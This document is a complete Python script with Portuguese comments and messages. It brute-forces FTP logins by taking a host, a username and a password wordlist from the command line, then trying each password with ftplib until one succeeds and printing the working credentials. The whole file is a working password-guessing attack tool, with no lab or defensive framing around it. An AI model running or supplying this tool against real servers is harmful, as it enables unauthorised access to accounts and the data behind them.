
# FTP Brute-Forcer

# Importando as Bibliotecas
import sys
import ftplib

# Função para conectar ao servidor FTP
def ftp_brute_forcer(host, username, password_list):
    try:
        with open(password_list, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[!] Wordlist '{password_list}' não encontrada.")
        return

    for password in passwords:
        password = password.strip()

        try:
            ftp = ftplib.FTP(host, timeout=5)
            ftp.login(username, password)
            print(f'[+] SUCESSO: USR: {username} | PWD: {password}')
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f'[-] Falha: {password}')
        except Exception as e:
            print(f'[!] Erro: {e}')
            continue

    print('[×] Ataque brute-force falhou. Nenhuma senha funcionou.')

# Validação dos parâmetros de entrada
if len(sys.argv) < 4:
    print('Uso: python3 ftp_bruteforce.py <host> <username> <wordlist.txt>')
    sys.exit(1)

host = sys.argv[1]
username = sys.argv[2]
password_list = sys.argv[3]

ftp_brute_forcer(host, username, password_list)
